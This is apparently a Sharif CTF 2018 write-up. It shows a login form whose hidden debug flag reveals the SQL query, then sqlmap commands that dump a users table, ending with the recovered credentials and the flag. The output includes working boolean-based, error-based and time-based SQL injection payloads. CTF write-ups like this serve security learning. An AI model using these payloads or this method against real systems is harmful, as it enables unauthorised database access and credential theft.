```
<form method="POST" action="login.php">
		<div class="login-block">
			<h1>Login</h1>
			<input type="text" value="" placeholder="Username" id="Username" name="Username"/>
			<input type="password" value="" placeholder="Password" id="Password" name="Password"/>
			<input type="hidden" name="debug" id="debug" value="0">
			<button>Login</button>
		</div>
	</form>
```

```
bl4de:~/hacking/ctf/2018/Sharif_CTF_2018 $ curl -v -X POST http://ctf.sharif.edu:8081/login.php -d debug=1 -d Username=xxx -d Password=xxx
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 213.233.175.130...
* TCP_NODELAY set
* Connected to ctf.sharif.edu (213.233.175.130) port 8081 (#0)
> POST /login.php HTTP/1.1
> Host: ctf.sharif.edu:8081
> User-Agent: curl/7.54.0
> Accept: */*
> Content-Length: 33
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 33 out of 33 bytes
< HTTP/1.1 200 OK
< Server: nginx/1.6.2
< Date: Fri, 02 Feb 2018 10:43:11 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 136
< Connection: keep-alive
< Vary: Accept-Encoding
<
<pre>username: xxx
password: xxx
SQL query: SELECT * FROM users WHERE username=('xxx') AND password=('xxx')
* Connection #0 to host ctf.sharif.edu left intact
</pre><h1>Login failed.</h1>
```

Request saved to file, then:

$ sqlmap -r post_req.txt

$ sqlmap -r post_req.txt -p Password --dbms=mysql

$ sqlmap -r post_req.txt -p Password --dbms=mysql --dbs

[17:39:23] [INFO] used SQL query returns 2 entries
[17:39:23] [INFO] retrieved: information_schema
[17:39:24] [INFO] retrieved: sharifctf
available databases [2]:
[*] information_schema
[*] sharifctf


$ sqlmap -r post_req.txt -p Password --dbms=mysql --tables -D sharifctf

[17:39:42] [INFO] used SQL query returns 1 entries
[17:39:43] [INFO] retrieved: users
Database: sharifctf
[1 table]
+-------+
| users |
+-------+



```
$ sqlmap -r post_req.txt -p Password --dbms=mysql --dump -D sharifctf -T users
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.1.25#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:40:05

[17:40:05] [INFO] parsing HTTP request from 'post_req.txt'
[17:40:06] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)
    Payload: Username=aaa&Password=bbb') OR NOT 7910=7910#&debug=1

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: Username=aaa&Password=bbb') OR (SELECT 6766 FROM(SELECT COUNT(*),CONCAT(0x7178767071,(SELECT (ELT(6766=6766,1))),0x7178787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VCew&debug=1

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: Username=aaa&Password=bbb') OR SLEEP(5)-- Nakq&debug=1
---
[17:40:06] [INFO] testing MySQL
[17:40:06] [INFO] confirming MySQL
[17:40:06] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.0
[17:40:06] [INFO] fetching columns for table 'users' in database 'sharifctf'
[17:40:06] [WARNING] reflective value(s) found and filtering out
[17:40:06] [INFO] used SQL query returns 3 entries
[17:40:06] [INFO] retrieved: userid
[17:40:07] [INFO] retrieved: int(11)
[17:40:07] [INFO] retrieved: username
[17:40:07] [INFO] retrieved: varchar(300)
[17:40:07] [INFO] retrieved: password
[17:40:08] [INFO] retrieved: text
[17:40:08] [INFO] fetching entries for table 'users' in database 'sharifctf'
[17:40:08] [INFO] used SQL query returns 1 entries
[17:40:08] [INFO] retrieved: &^FJ@*!#^T!)*$
[17:40:08] [INFO] retrieved: 1
[17:40:09] [INFO] retrieved: Gabriel
Database: sharifctf
Table: users
[3 entries]
+----------------+----------------+----------------+
| userid         | username       | password       |
+----------------+----------------+----------------+
| &^FJ@*!#^T!)*$ | &^FJ@*!#^T!)*$ | &^FJ@*!#^T!)*$ |
| 1              | 1              | 1              |
| Gabriel        | Gabriel        | Gabriel        |
+----------------+----------------+----------------+

[17:40:09] [INFO] table 'sharifctf.users' dumped to CSV file '/Users/bl4de/.sqlmap/output/ctf.sharif.edu/dump/sharifctf/users.csv'
[17:40:09] [INFO] fetched data logged to text files under '/Users/bl4de/.sqlmap/output/ctf.sharif.edu'

[*] shutting down at 17:40:09
```

Username: Gabriel
Password: &^FJ@*!#^T!)*$

```
Your flag is: SharifCTF{c58a108967c46222bbdc743e15932c26}
```